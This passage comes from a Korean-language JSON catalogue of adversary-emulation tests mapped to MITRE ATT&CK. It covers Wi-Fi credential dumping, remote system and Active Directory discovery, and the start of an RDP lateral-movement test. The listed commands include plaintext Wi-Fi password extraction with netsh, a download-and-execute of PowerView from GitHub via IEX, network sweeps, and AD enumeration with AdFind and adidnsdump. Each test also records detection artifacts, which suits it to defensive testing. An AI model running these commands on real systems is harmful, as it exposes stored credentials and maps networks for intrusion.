  "description": "Wi-Fi Discovery는 호스트에 저장된 무선 네트워크(SSID) 프로필과 해당 보안 키(패스워드) 정보를 열람하여, 공격에 활용 가능한 무선 네트워크 자격 증명을 수집하는 기법이다. Windows에서는 netsh wlan 명령으로 과거에 연결된 AP 목록과 암호를 평문으로 확인할 수 있으며, 이는 다른 네트워크로의 확장 이동이나 추가 침투에 악용될 수 있다.",
  "tests": [
    {
      "test_id": "T1016.002-1",
      "name": "Enumerate Stored Wi-Fi Profiles And Passwords via netsh",
      "platforms": ["windows"],
      "summary": "Windows의 netsh wlan 명령을 사용해 이 시스템에 저장된 Wi-Fi 프로필과 해당 키(있을 경우)를 평문으로 나열한다.",
      "procedure": [
        "cmd.exe를 연다.",
        "netsh wlan show profile * key=clear 명령을 실행한다.",
        "출력 결과에서 다음 정보를 확인한다:",
        "  - 저장된 모든 Wi-Fi 프로필(SSID) 이름",
        "  - 각 프로필의 인증/암호화 방식",
        "  - '보안 키' 항목과 '키 콘텐츠(Key Content)'에 표시되는 평문 패스워드(존재하는 경우)",
        "획득한 SSID 및 패스워드 정보를 이용해 동일 네트워크에 재접속하거나, 다른 장비에 연결을 시도할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "netsh wlan show profile * key=clear"
        }
      ],
      "prerequisites": [
        "대상 시스템에 이전에 연결한 Wi-Fi 프로필이 하나 이상 저장되어 있어야 한다.",
        "현재 사용자 컨텍스트에서 netsh wlan show profile * key=clear 명령 실행이 허용되어야 한다(일반적으로 관리자 권한 불필요)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "netsh.exe",
            "description": "wlan 서브콘텍스트를 통해 저장된 무선 프로필 및 키를 열람",
            "commandline_pattern": "netsh wlan show profile * key=clear"
          }
        ],
        "network": []
      },
      "cleanup": [
        "실행 결과는 stdout에만 출력되며, 시스템 설정 변경이나 파일 생성이 없으므로 별도의 정리 작업은 필요 없다.",
        "다만 화면에 노출된 SSID/패스워드는 캡처·로그 등에 남지 않도록 주의한다."
      ],
      "tags": {
        "action": ["wifi_profile_enum", "credential_discovery"],
        "domain": ["Discovery"],
        "ttp": ["WiFi_Profile_And_Key_Enumeration"]
      },
      "metadata": {
        "atomic_source_id": "53cf1903-0fa7-4177-ab14-f358ae809eec",
        "reference_links": [
          "https://attack.mitre.org/techniques/T1016/002/"
        ]
      }
    }
  ]
},
{
  "technique_id": "T1018",
  "technique_name": "Remote System Discovery",
  "tactic": "Discovery",
  "description": "원격 시스템 발견(Remote System Discovery)은 공격자가 네트워크 상의 다른 호스트, 도메인 구성원, 도메인 컨트롤러 등을 식별하기 위해 수행하는 정찰 활동이다. 이를 통해 이후 측면 이동(lateral movement) 대상과 경로를 선정하고, 권한 상승 및 지속성 확보에 유리한 시스템을 파악할 수 있다. Windows 환경에서는 net.exe, nltest, PowerShell, AdFind, Netscan 등의 도구가 자주 사용된다.",
  "tests": [
    {
      "test_id": "T1018-1",
      "name": "Remote System Discovery - net",
      "platforms": ["windows"],
      "summary": "net.exe를 사용해 도메인 및 로컬 네트워크에서 공유가 활성화된 시스템 목록을 조회한다. 기본적인 SMB/브라우저 기반 원격 호스트 정찰 시나리오이다.",
      "procedure": [
        "cmd.exe를 실행한다.",
        "net view /domain 명령으로 도메인 브라우저 목록을 조회한다.",
        "net view 명령으로 로컬 네트워크에서 공유가 열려 있는 시스템 목록을 조회한다.",
        "출력 결과를 기반으로 추가 정찰 또는 측면 이동 대상 시스템을 선별한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net view /domain && net view"
        }
      ],
      "prerequisites": [
        "호스트가 도메인 또는 워크그룹에 속해 있어야 한다.",
        "네트워크 상의 다른 시스템에 파일/프린터 공유가 활성화되어 있어야 net view 결과에 나타난다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "net view 명령을 실행하는 명령 프롬프트",
            "commandline_pattern": "net view*"
          },
          {
            "name": "net.exe",
            "description": "도메인 및 워크그룹의 원격 시스템 목록을 조회",
            "commandline_pattern": "net view*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "디스크에 생성되는 파일이 없으므로 별도의 클린업이 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "85321a9c-897f-4a60-9f20-29788e50bccd"
      }
    },
    {
      "test_id": "T1018-2",
      "name": "Remote System Discovery - net group Domain Computers",
      "platforms": ["windows"],
      "summary": "net.exe를 사용해 Active Directory의 \"Domain Computers\" 그룹을 조회한다. 도메인에 가입된 워크스테이션과 서버 목록을 한 번에 확인하는 정찰 기법이다.",
      "procedure": [
        "cmd.exe를 실행한다.",
        "net group \"Domain Computers\" /domain 명령을 실행해 도메인 컴퓨터 그룹을 조회한다.",
        "출력된 시스템 목록을 기반으로 추가 스캔 또는 측면 이동 대상을 선정한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net group \"Domain Computers\" /domain"
        }
      ],
      "prerequisites": [
        "테스트 호스트가 도메인에 조인되어 있어야 한다.",
        "도메인 컨트롤러와 네트워크 통신이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "net group 명령을 실행하는 명령 프롬프트",
            "commandline_pattern": "net group \"Domain Computers\" /domain"
          },
          {
            "name": "net.exe",
            "description": "도메인의 Domain Computers 그룹 멤버 조회",
            "commandline_pattern": "net group*Domain Computers*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "별도의 파일이 생성되지 않으므로 클린업 단계는 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "f1bf6c8f-9016-4edf-aff9-80b65f5d711f"
      }
    },
    {
      "test_id": "T1018-3",
      "name": "Remote System Discovery - nltest",
      "platforms": ["windows"],
      "summary": "nltest.exe를 이용해 특정 도메인의 도메인 컨트롤러 목록을 조회한다. 공격자는 DC를 식별해 인증 공격, 티켓 도난, 측면 이동 대상으로 활용할 수 있다.",
      "procedure": [
        "cmd.exe 또는 PowerShell에서 target_domain 값을 확인한다(기본: %userdnsdomain%).",
        "nltest.exe /dclist:<domain> 명령을 실행한다.",
        "출력된 도메인 컨트롤러 목록을 분석해 핵심 인프라 시스템을 파악한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "nltest.exe /dclist:%userdnsdomain%"
        }
      ],
      "prerequisites": [
        "테스트 호스트가 도메인에 조인되어 있거나, 조회 대상 도메인을 해석할 수 있어야 한다.",
        "nltest.exe가 시스템에 존재해야 한다(기본적으로 도메인 환경의 Windows에 포함)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "nltest.exe",
            "description": "도메인 컨트롤러 목록을 조회하는 도메인 진단 도구",
            "commandline_pattern": "nltest.exe /dclist*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "추가 파일이나 레지스트리 변경이 없으므로 별도 정리 작업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "52ab5108-3f6f-42fb-8ba3-73bc054f22c8"
      }
    },
    {
      "test_id": "T1018-4",
      "name": "Remote System Discovery - ping sweep",
      "platforms": ["windows"],
      "summary": "간단한 for 루프와 ping 명령을 사용해 지정된 서브넷(기본 192.168.1.0/24)에 대해 ping sweep을 수행한다. 응답하는 IP를 통해 활성 호스트를 식별한다.",
      "procedure": [
        "시작/종료 호스트 및 서브넷 값을 설정한다(예: start=1, stop=254, subnet=192.168.1).",
        "cmd.exe에서 for /l 루프를 사용해 각 IP로 ping -n 1 -w 100을 수행한다.",
        "응답 결과를 눈으로 확인하거나 로그 리다이렉션을 통해 저장해 분석한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
        }
      ],
      "prerequisites": [
        "ICMP 에코 요청이 방화벽에 의해 차단되지 않아야 한다.",
        "테스트 시스템이 대상 서브넷과 라우팅 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "for 루프를 실행하는 명령 프롬프트",
            "commandline_pattern": "for /l %i in*ping -n 1*"
          },
          {
            "name": "ping.exe",
            "description": "각 대상 IP에 대해 ICMP 에코 요청을 전송",
            "commandline_pattern": "ping -n 1 -w 100 192.168.1.*"
          }
        ],
        "network": [
          {
            "description": "192.168.1.0/24에 대한 다수의 ICMP 에코 요청",
            "protocol": "ICMP",
            "port": null
          }
        ]
      },
      "cleanup": [
        "콘솔 출력만 생성되므로 별도 정리 작업은 필요하지 않다.",
        "로그로 리다이렉션했다면 해당 텍스트 파일을 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "6db1f57f-d1d5-4223-8a66-55c9c65a9592"
      }
    },
    {
      "test_id": "T1018-5",
      "name": "Remote System Discovery - arp",
      "platforms": ["windows"],
      "summary": "arp -a 명령을 사용해 로컬 시스템의 ARP 캐시를 조회한다. 최근 통신한 로컬 세그먼트 내 호스트의 IP/MAC 정보를 확인할 수 있다.",
      "procedure": [
        "cmd.exe를 실행한다.",
        "arp -a 명령을 사용해 현재 ARP 캐시를 덤프한다.",
        "IP–MAC 매핑 정보를 바탕으로 로컬 네트워크 상의 활성 호스트를 식별한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "arp -a"
        }
      ],
      "prerequisites": [
        "이전에 동일 브로드캐스트 도메인 내 다른 호스트와 통신한 기록이 있어야 의미 있는 ARP 캐시가 남는다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "arp.exe",
            "description": "ARP 캐시를 보여주는 네트워크 진단 도구",
            "commandline_pattern": "arp -a"
          }
        ],
        "network": []
      },
      "cleanup": [
        "arp -d 명령을 통해 ARP 캐시를 수동으로 정리할 수 있으나, 일반적으로 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "2d5a61f5-0447-4be4-944a-1f8530ed6574"
      }
    },
    {
      "test_id": "T1018-6",
      "name": "Remote System Discovery - nslookup sweep",
      "platforms": ["windows"],
      "summary": "PowerShell에서 로컬 IP를 기준으로 /24 대역을 계산한 후, 각 IP에 대해 nslookup을 수행해 이름을 조회한다. 역방향 DNS를 통해 활성 호스트와 호스트명을 수집하는 기법이다.",
      "procedure": [
        "ipconfig 출력에서 첫 번째 IPv4 주소를 파싱해 /24 서브넷의 앞 세 옥텟을 추출한다.",
        "1~255 범위의 마지막 옥텟에 대해 반복문을 돌며 nslookup을 실행한다.",
        "역방향 DNS가 설정된 IP에 대해 호스트명을 수집한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split('.'); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255) { cmd.exe /c nslookup \"$firstOctet.$secondOctet.$thirdOctet.$ip\" }"
        }
      ],
      "prerequisites": [
        "로컬 네트워크에 대해 역방향 DNS가 설정되어 있어야 의미 있는 결과가 나온다.",
        "nslookup 실행 시 사용할 DNS 서버와의 통신이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ipconfig 결과를 파싱하고 nslookup을 반복 호출하는 스크립트",
            "commandline_pattern": "*ipconfig*nslookup*"
          },
          {
            "name": "nslookup.exe",
            "description": "각 IP에 대해 DNS 조회를 수행",
            "commandline_pattern": "nslookup *"
          }
        ],
        "network": [
          {
            "description": "로컬 /24 대역에 대한 다수의 DNS 쿼리",
            "protocol": "DNS",
            "port": 53
          }
        ]
      },
      "cleanup": [
        "콘솔 출력만 생성되므로 추가적인 정리 작업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "baa01aaa-5e13-45ec-8a0d-e46c93c9760f"
      }
    },
    {
      "test_id": "T1018-7",
      "name": "Remote System Discovery - adidnsdump",
      "platforms": ["windows"],
      "summary": "adidnsdump 도구를 사용해 Active Directory 통합 DNS 존의 레코드를 덤프한다. 내부 네트워크의 서버, 워크스테이션, 서비스 레코드를 한 번에 수집하는 고급 정찰 기법이다.",
      "procedure": [
        "Python 3과 adidnsdump가 설치된 가상환경(venv)을 준비한다.",
        "도메인 계정 자격 증명과 타깃 DNS 서버/도메인 컨트롤러 정보를 설정한다.",
        "adidnsdump -u <user> -p <pass> --print-zones <host> 명령을 실행한다.",
        "출력된 DNS 존과 레코드 목록을 분석해 내부 자산 구조를 파악한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1018\\Scripts\\adidnsdump -u domain\\user -p password --print-zones 192.168.1.1"
        }
      ],
      "prerequisites": [
        "테스트 호스트에 Python 3가 설치되어 있어야 한다.",
        "지정된 venv 경로에 adidnsdump가 설치되어 있어야 한다.",
        "도메인 DNS/AD에 접근 가능한 유효한 계정 자격 증명이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "adidnsdump",
            "description": "Active Directory 통합 DNS 존 레코드를 덤프하는 도구",
            "commandline_pattern": "*adidnsdump*--print-zones*"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러/AD DNS 서버와의 LDAP/DNS 통신",
            "protocol": "DNS/LDAP",
            "port": null
          }
        ]
      },
      "cleanup": [
        "필요 시 adidnsdump 출력 결과를 파일로 저장했다면 해당 파일을 삭제할 수 있다.",
        "테스트용 venv나 설치 파일을 제거해 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "95e19466-469e-4316-86d2-1dc401b5a959"
      }
    },
    {
      "test_id": "T1018-8",
      "name": "Adfind - Enumerate Active Directory Computer Objects",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 이용해 objectcategory=computer 조건으로 AD에서 컴퓨터 객체를 열거한다. 랜섬웨어 그룹 등에서 내부 호스트 목록 수집에 활용된 정찰 패턴이다.",
      "procedure": [
        "지정된 경로에 AdFind.exe가 존재하는지 확인한다.",
        "필요하다면 GitHub 등에서 AdFind.exe를 내려받아 ExternalPayloads 경로에 저장한다.",
        "\"AdFind.exe -f (objectcategory=computer)\" 명령을 실행한다.",
        "출력된 컴퓨터 객체 목록을 바탕으로 추가 공격 대상을 선정한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -f (objectcategory=computer)"
        }
      ],
      "prerequisites": [
        "지정된 위치에 AdFind.exe가 존재해야 한다.",
        "도메인 컨트롤러와 통신 가능하며, LDAP 쿼리를 수행할 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "Active Directory 객체를 LDAP 쿼리로 열거하는 도구",
            "commandline_pattern": "*AdFind.exe -f (objectcategory=computer)*"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러와의 LDAP/GC 쿼리 트래픽",
            "protocol": "LDAP",
            "port": 389
          }
        ]
      },
      "cleanup": [
        "명령 출력이 파일로 리다이렉션되었다면 해당 결과 파일을 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "a889f5be-2d54-4050-bd05-884578748bb4"
      }
    },
    {
      "test_id": "T1018-9",
      "name": "Adfind - Enumerate Active Directory Domain Controller Objects",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 사용해 도메인 컨트롤러 객체를 열거한다. -sc dclist 스위치를 통해 도메인 내 DC 목록을 빠르게 확인할 수 있다.",
      "procedure": [
        "지정된 경로에 AdFind.exe가 있는지 확인한다.",
        "cmd.exe에서 \"AdFind.exe -sc dclist\" 또는 추가 인자를 포함한 명령을 실행한다.",
        "출력 결과에서 도메인 컨트롤러의 이름과 정보를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -sc dclist"
        }
      ],
      "prerequisites": [
        "AdFind.exe가 지정된 경로에 존재해야 한다.",
        "도메인 컨트롤러에 대한 LDAP 쿼리가 가능한 네트워크/권한 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "도메인 컨트롤러 목록을 질의하는 데 사용",
            "commandline_pattern": "*AdFind.exe* -sc dclist*"
          }
        ],
        "network": [
          {
            "description": "AD 도메인 컨트롤러를 향한 LDAP 쿼리",
            "protocol": "LDAP",
            "port": 389
          }
        ]
      },
      "cleanup": [
        "출력 결과가 파일에 저장되었다면 해당 파일을 삭제해 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "5838c31e-a0e2-4b9f-b60a-d79d2cb7995e"
      }
    },
    {
      "test_id": "T1018-10",
      "name": "Enumerate domain computers with DirectorySearcher",
      "platforms": ["windows"],
      "summary": "PowerShell에서 System.DirectoryServices.DirectorySearcher를 사용해 AD 내 Computer 객체를 검색한다. 추가 도구 없이 .NET API만으로 도메인 컴퓨터 목록을 얻는 방법이다.",
      "procedure": [
        "테스트 시스템이 도메인에 조인되어 있는지 확인한다.",
        "PowerShell에서 DirectorySearcher를 생성하고 필터를 \"(ObjectCategory=Computer)\"로 설정한다.",
        "Search 결과의 name 속성을 순회하며 컴퓨터 이름을 출력한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\") | Out-Null; $Computers = $DirectorySearcher.FindAll(); foreach ($Computer in $Computers) { $name = $Computer.Properties.name; if ($name) { Write-Host $name } }"
        }
      ],
      "prerequisites": [
        "해당 시스템이 도메인에 조인되어 있어야 한다.",
        "PowerShell에서 System.DirectoryServices 네임스페이스를 사용할 수 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "DirectorySearcher를 이용해 AD에서 컴퓨터 객체를 조회",
            "commandline_pattern": "*System.DirectoryServices.DirectorySearcher*ObjectCategory=Computer*"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러를 향한 LDAP 쿼리",
            "protocol": "LDAP",
            "port": 389
          }
        ]
      },
      "cleanup": [
        "출력이 콘솔에만 남으므로 별도의 정리 과정은 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "962a6017-1c09-45a6-880b-adc9c57cb22e"
      }
    },
    {
      "test_id": "T1018-11",
      "name": "Enumerate Active Directory Computers with Get-ADComputer",
      "platforms": ["windows"],
      "summary": "ActiveDirectory PowerShell 모듈의 Get-ADComputer cmdlet을 사용해 도메인 내 모든 컴퓨터 객체를 나열한다.",
      "procedure": [
        "ActiveDirectory 모듈이 설치 및 Import 되어 있는지 확인한다.",
        "PowerShell에서 Get-ADComputer -Filter * 명령을 실행한다.",
        "출력 결과를 통해 컴퓨터 이름, DN 등 AD 상의 경로 정보를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ADComputer -Filter *"
        }
      ],
      "prerequisites": [
        "도메인에 조인된 시스템이어야 하며, ActiveDirectory PowerShell 모듈이 설치되어 있어야 한다.",
        "AD에서 컴퓨터 객체를 열람할 수 있는 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-ADComputer cmdlet을 사용해 AD 컴퓨터를 열거",
            "commandline_pattern": "Get-ADComputer -Filter *"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러에 대한 AD Web Service/LDAP 요청",
            "protocol": "LDAP",
            "port": 389
          }
        ]
      },
      "cleanup": [
        "명령 실행만 수행하므로 클린업이 필요하지 않다."
      ],
      "metadata": {
        "atomic_source_id": "97e89d9e-e3f5-41b5-a90f-1e0825df0fdf"
      }
    },
    {
      "test_id": "T1018-12",
      "name": "Enumerate Active Directory Computers with ADSISearcher",
      "platforms": ["windows"],
      "summary": "PowerShell의 [adsisearcher] 타입 가속기를 사용해 AD에서 objectcategory=computer 필터로 컴퓨터 객체를 열거한다.",
      "procedure": [
        "PowerShell 콘솔을 연다.",
        "\"([adsisearcher]\"objectcategory=computer\").FindAll()\" 명령을 실행한다.",
        "추가로 FindOne()을 사용해 단일 결과를 확인할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()"
        }
      ],
      "prerequisites": [
        "시스템이 도메인에 조인되어 있어야 하며, AD 쿼리에 사용할 자격 증명이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ADSISearcher 타입 가속기를 사용해 AD에서 컴퓨터 객체를 열거",
            "commandline_pattern": "([adsisearcher]\"objectcategory=computer\")*"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러와의 LDAP 통신",
            "protocol": "LDAP",
            "port": 389
          }
        ]
      },
      "cleanup": [
        "쿼리 실행만 수행하므로 별도 정리 과정은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "64ede6ac-b57a-41c2-a7d1-32c6cd35397d"
      }
    },
    {
      "test_id": "T1018-13",
      "name": "Get-DomainController with PowerView",
      "platforms": ["windows"],
      "summary": "PowerSploit의 PowerView 모듈을 메모리 상에 로드한 후 Get-DomainController 함수를 사용해 도메인 컨트롤러 정보를 수집한다.",
      "procedure": [
        "인터넷에서 PowerView.ps1 스크립트를 다운로드해 IEX로 메모리 로드한다.",
        "Get-DomainController -Verbose 명령을 실행해 도메인 컨트롤러 정보를 조회한다.",
        "결과를 분석해 도메인 컨트롤러의 이름, IP, 도메인 정보를 파악한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -Verbose"
        }
      ],
      "prerequisites": [
        "테스트 시스템이 인터넷에 접근 가능해야 하며 GitHub에 접속할 수 있어야 한다.",
        "실행 정책 및 보안 솔루션이 스크립트 다운로드/실행을 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "PowerView를 로드하고 Get-DomainController를 실행",
            "commandline_pattern": "*PowerView.ps1*Get-DomainController*"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 PowerView.ps1를 다운로드하는 HTTP/HTTPS 트래픽",
            "protocol": "HTTPS",
            "port": 443
          }
        ]
      },
      "cleanup": [
        "스크립트는 메모리에서만 로드하므로 세션을 종료하면 대부분 흔적이 사라진다.",
        "프록시/방화벽 로그 등에는 GitHub 접속 이력이 남을 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "b9d2e8ca-5520-4737-8076-4f08913da2c4"
      }
    },
    {
      "test_id": "T1018-14",
      "name": "Get-WmiObject to Enumerate Domain Controllers",
      "platforms": ["windows"],
      "summary": "get-wmiobject를 사용해 root\\directory\\ldap 네임스페이스에서 ds_computer 클래스를 질의한다. 이를 통해 AD 내 시스템 목록(특히 DC)을 열거할 수 있다.",
      "procedure": [
        "PowerShell에서 get-wmiobject -class ds_computer -namespace root\\directory\\ldap 명령을 실행한다.",
        "오류 발생 시 예외 코드를 확인해 권한/연결 문제를 진단한다.",
        "정상 실행 시 결과에 포함된 시스템 및 도메인 컨트롤러 정보를 분석한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop } catch { $_; exit $_.Exception.HResult }"
        }
      ],
      "prerequisites": [
        "도메인 컨트롤러와의 WMI/LDAP 통신이 가능해야 한다.",
        "해당 WMI 네임스페이스에 접근 가능한 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WMI를 통해 LDAP 네임스페이스의 ds_computer 클래스를 질의",
            "commandline_pattern": "get-wmiobject -class ds_computer -namespace root\\directory\\ldap*"
          }
        ],
        "network": [
          {
            "description": "DC와의 WMI/RPC 통신 및 LDAP 연계 트래픽",
            "protocol": "RPC/LDAP",
            "port": null
          }
        ]
      },
      "cleanup": [
        "WMI 쿼리는 상태를 변경하지 않으므로 별도의 정리 작업이 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad"
      }
    },
    {
      "test_id": "T1018-15",
      "name": "Remote System Discovery - net group Domain Controller",
      "platforms": ["windows"],
      "summary": "net.exe를 사용해 도메인 내 \"Domain Controllers\" 그룹 구성원을 조회한다. 도메인 컨트롤러 목록을 간단히 확인하는 정찰 기법이다.",
      "procedure": [
        "cmd.exe를 실행한다.",
        "net group /domain \"Domain Controllers\" 명령을 실행한다.",
        "결과에 표시된 도메인 컨트롤러 이름을 기반으로 추가 공격 경로를 계획한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net group /domain \"Domain controllers\""
        }
      ],
      "prerequisites": [
        "테스트 시스템이 도메인에 조인되어 있어야 한다.",
        "도메인 그룹 정보를 조회할 수 있는 권한이 필요하다(일반 사용자 권한으로도 가능)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "net.exe",
            "description": "도메인의 Domain Controllers 그룹 멤버를 조회",
            "commandline_pattern": "net group /domain \"Domain controllers\""
          }
        ],
        "network": []
      },
      "cleanup": [
        "콘솔 출력만 생성되므로 별도 클린업은 필요 없다."
      ],
      "metadata": {
        "atomic_source_id": "5843529a-5056-4bc1-9c13-a311e2af4ca0"
      }
    },
    {
      "test_id": "T1018-16",
      "name": "Enumerate Remote Hosts with Netscan",
      "platforms": ["windows"],
      "summary": "SoftPerfect NetScan 포터블 버전을 사용해 지정된 IP 범위에 대해 스캔을 수행한다. UI 없이 /auto 옵션을 사용해 결과를 파일로 저장하는 방식이다.",
      "procedure": [
        "지정된 경로에 Netscan 포터블 압축 파일을 다운로드하고 압축을 해제한다.",
        "netscan.exe 경로와 스캔할 IP 범위를 설정한다(예: 127.0.0.1-127.0.0.1).",
        "커맨드라인에서 /hide /auto /range 옵션을 사용해 스캔을 실행한다.",
        "생성된 결과 파일(T1018NetscanOutput.txt)을 열어 활성 호스트와 포트 정보를 분석한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\\64-bit\\netscan.exe\" /hide /auto:\"$env:TEMP\\T1018NetscanOutput.txt\" /range:127.0.0.1-127.0.0.1"
        }
      ],
      "prerequisites": [
        "지정된 경로에 netscan.exe가 존재해야 한다.",
        "테스트 호스트에서 대상 IP 범위로의 네트워크 통신이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\T1018NetscanOutput.txt",
            "description": "Netscan이 생성한 스캔 결과 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "netscan.exe",
            "description": "지정된 IP 범위를 스캔하는 SoftPerfect NetScan 실행 파일",
            "commandline_pattern": "netscan.exe /hide /auto* /range:*"
          }
        ],
        "network": [
          {
            "description": "지정된 IP 범위에 대한 TCP/UDP 포트 스캔 트래픽",
            "protocol": "TCP/UDP",
            "port": null
          }
        ]
      },
      "cleanup": [
        "생성된 결과 파일 %TEMP%\\T1018NetscanOutput.txt를 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "b8147c9a-84db-4ec1-8eee-4e0da75f0de5"
      }
    }
  ]
},
{
  "technique_id": "T1021.001",
  "technique_name": "Remote Services: Remote Desktop Protocol",
  "tactic": "Lateral Movement",
  "description": "RDP(Remote Desktop Protocol)은 원격 시스템에 대화형 세션으로 접속하기 위한 윈도우 기본 원격 서비스이다. 공격자는 RDP를 이용해 도메인 컨트롤러 등 핵심 시스템으로 측면 이동하거나, 비표준 포트와 인증 설정 변경을 통해 탐지 회피 및 지속성을 확보하려 한다. 포트 변경·NLA 비활성화·자격 증명 사전 등록 등은 대표적인 악용 패턴이다.",
  "tests": [
    {
      "test_id": "T1021.001-1",
      "name": "RDP to DomainController",
      "platforms": ["windows"],
      "summary": "도메인에 조인된 호스트에서 현재 로그온 서버(도메인 컨트롤러)에 RDP 세션을 시도한다. cmdkey로 자격 증명을 미리 저장한 뒤 mstsc를 통해 RDP 접속을 수행하는 시나리오이다.",
      "procedure": [
        "테스트 호스트가 도메인에 조인되어 있는지 확인한다.",
        "환경 변수에서 도메인 이름(USERDOMAIN), 사용자 이름(USERNAME), 로그온 서버(LOGONSERVER)를 가져온다.",
        "cmdkey /generic:TERMSRV/<Server> /user:<Domain\\User> /pass:<Password> 명령으로 RDP용 자격 증명을 저장한다.",
